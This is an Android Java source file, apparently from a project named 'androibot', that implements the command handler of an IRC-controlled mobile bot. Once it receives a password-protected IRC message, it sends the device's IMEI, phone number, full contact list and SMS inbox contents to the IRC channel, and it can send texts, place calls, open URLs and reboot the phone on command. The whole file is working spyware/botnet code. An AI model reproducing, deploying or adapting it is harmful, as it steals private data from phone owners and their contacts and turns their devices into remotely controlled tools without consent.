package xjtu.androibot;

import android.app.PendingIntent;
import android.app.Activity;
import android.content.BroadcastReceiver;
import android.content.ContentResolver;
import android.content.Context;
import android.content.Intent;
import android.database.Cursor;
import android.net.Uri;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;
import android.telephony.gsm.SmsManager;
import android.telephony.TelephonyManager;
import android.util.Log;
import android.provider.ContactsContract;
import android.provider.ContactsContract.PhoneLookup;

import xjtu.androibot.IRCMessage;

//import xjtu.sillybot.Network;

public class HandleCommand
{
	String CMDPWD = "sillyzily";
	Context context;
	IRCMessage ircMsg;
	
	public HandleCommand(Context context, IRCMessage ircMsg)
	{
		this.context = context;
		this.ircMsg = ircMsg;
	}
	
	public void HandleIRC()
	{
		String channel = ircMsg.channel;		
		String sender = ircMsg.sender;
		String login = ircMsg.login;
		String hostname = ircMsg.hostname;
		String message = ircMsg.message;
		
		Toast.makeText(context, "在" + channel + "接收到" + sender + "的命令：\n"+message, Toast.LENGTH_LONG).show();	
    	
    	String[] strs = message.split(":");
    	if(strs.length < 3)
    	{
    		return;
    	}
    	String pwd = strs[1];
    	String command = strs[2];
    	if(pwd.compareToIgnoreCase(CMDPWD) != 0)
    	{
    		return;
    	}
    	
    	//响应命令
    	try
    	{
    		if(command.compareToIgnoreCase("hellobot") == 0)
    		{
    			MainActivity.bot.sendMessage(channel, "hellomaster");    			
        	}
    		else if(command.compareToIgnoreCase("info") == 0)
    		{  
    			TelephonyManager telephonyManager = (TelephonyManager)context.getSystemService(Context.TELEPHONY_SERVICE);
    			String imei = telephonyManager.getDeviceId();
    			String phonenum = telephonyManager.getLine1Number();
    			String sim = telephonyManager.getSimSerialNumber();
    			
    			String manufact = android.os.Build.MANUFACTURER;
    			String device = android.os.Build.DEVICE;
    			String model = android.os.Build.MODEL;
    			String product = android.os.Build.PRODUCT;
    			String osname = System.getProperty("os.name");
    			String osversion = System.getProperty("os.version");
    			//String str = osname+","+osversion+"\n"+manufact + "," + device+","+model+","+product;    		
    		    String str = "IMEI:" + imei + ", PHONENUM:" + phonenum + ", OS:" + osname + " " + osversion;
    			
    			MainActivity.bot.sendMessage(channel, str);
    		}
    		else if(command.startsWith("sendmsg"))
    		{
    			int index1 = command.indexOf(" ");
    			int index2 = command.indexOf(" ", index1 + 1);
    			String sendto = command.substring(index1 + 1, index2);
    			String text = command.substring(index2 + 1);   	       
    	    
    			SmsManager smsManager = SmsManager.getDefault();
    			PendingIntent pintent = PendingIntent.getBroadcast(context, 0, new Intent(), 0);
    			smsManager.sendTextMessage(sendto, null, text, pintent, null);
    			
    			
    			MainActivity.bot.sendMessage(channel, "OK");
    		
    		}    	
    		else if(command.startsWith("openurl"))
    		{    		
    			int index1 = command.indexOf(" ");    			
    			String url = command.substring(index1 + 1);
    			Uri uri = Uri.parse(url);
    			Intent it = new Intent(Intent.ACTION_VIEW, uri);
    			it.setClassName("com.android.browser", "com.android.browser.BrowserActivity");
    			it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    			context.startActivity(it);
    			
    			MainActivity.bot.sendMessage(channel, "OK");    		
    		}
    		else if(command.startsWith("call"))
    		{
    		
    			int index1 = command.indexOf(" ");    			
    			String num = command.substring(index1 + 1);
    			Uri uri = Uri.parse("tel:" + num);    			
    			Intent it = new  Intent(Intent.ACTION_CALL, uri);
    			//it.addFlags(Intent.FLAG_ACTIVITY_SINGLE_TOP);
    			it.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
    			context.startActivity(it); 
    			
    			MainActivity.bot.sendMessage(channel, "OK");
    		}  
    		else if(command.equalsIgnoreCase("reboot"))
    		{
    			Intent it = new Intent(Intent.ACTION_REBOOT);
    			context.sendBroadcast(it);
    			MainActivity.bot.sendMessage(channel, "Rebooting");
    		}
    		else if(command.equalsIgnoreCase("contact"))
    		{    			
    			ContentResolver cr = context.getContentResolver();
    			Cursor cursor = cr.query(ContactsContract.Contacts.CONTENT_URI, null, null, null, null);
    			int num = cursor.getCount();
    			if(num<=0)
    			{
    				String str = "No Contact Information";
    				MainActivity.bot.sendMessage(channel, str); 
    			}
    			else
    			{  				
    				while(cursor.moveToNext())
        			{   					
        				String name = cursor.getString(cursor.getColumnIndex(PhoneLookup.DISPLAY_NAME));        				
        				String id = cursor.getString(cursor.getColumnIndex(ContactsContract.Contacts._ID));        				
        				Cursor phones = cr.query(ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, ContactsContract.CommonDataKinds.Phone.CONTACT_ID + "=" + id, null, null);
        				String info = name+":";
        				int count=0;
    					while(phones.moveToNext())
    					{
    						String phoneNum = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
    						if(count==0)
    						{
    							info = info + phoneNum;
    						}
    						else
    						{
    							info = info + "," + phoneNum;
    						}    						
    						count++;
    					}    					  					
    					phones.close();    					
    					MainActivity.bot.sendMessage(channel, info); 
        			}
    			}
    			cursor.close();			 
    		}
    		else if(command.startsWith("sms"))
    		{
    			String str="";
    			//sms inbox 1
    			int index1 = command.indexOf(" ");
    			int index2 = command.indexOf(" ", index1 + 1);
    			String box = command.substring(index1 + 1, index2);
    			String num = command.substring(index2 + 1);
    			
    			Cursor cursor;
    			if(num.equalsIgnoreCase("all"))
    			{
    				cursor = context.getContentResolver().query(Uri.parse("content://sms/" + box), null, null, null, null);
    			}
    			else
    			{
    				cursor = context.getContentResolver().query(Uri.parse("content://sms/" + box), null, "_id="+num, null, null);    				
    			}
    			if(cursor.getCount()<=0)
    			{
    				str="No Result";
    				MainActivity.bot.sendMessage(channel, str);
    			}
    			else
    			{
    				while(cursor.moveToNext())
    				{
    					String name="unknown";
    					String id = cursor.getString(cursor.getColumnIndex("person"));
    					String phoneNum = cursor.getString(cursor.getColumnIndex("address"));
    					String sms = cursor.getString(cursor.getColumnIndex("body"));
    					//查询id
    					try
    					{
    						Cursor cursor_phone = context.getContentResolver().query(ContactsContract.Contacts.CONTENT_URI, null, ContactsContract.Contacts._ID+"="+id, null, null);
    						if(cursor_phone.moveToFirst())
    						{ 
    							/*
    							String[] names = phones.getColumnNames();
    							for(int i=0;i<names.length;i++)
    							{
    								MainActivity.bot.sendMessage(channel, names[i]);    
    							}
    							*/
    							name = cursor_phone.getString(cursor_phone.getColumnIndex("display_name"));
    						}
    					}
    					catch(Exception exp)
    					{
    						MainActivity.bot.sendMessage(channel, exp.getMessage());
    					}
    					str="{" + name + "[" + phoneNum + "]}: " + sms;
    					MainActivity.bot.sendMessage(channel, str);
    					Log.d("irc", channel+":" + str);
    				}
    			}		
    		}
    	}
    	catch(Exception e)
    	{
    		MainActivity.bot.sendMessage(channel, "Exception:" + e.getMessage());
    	}
	}
	
}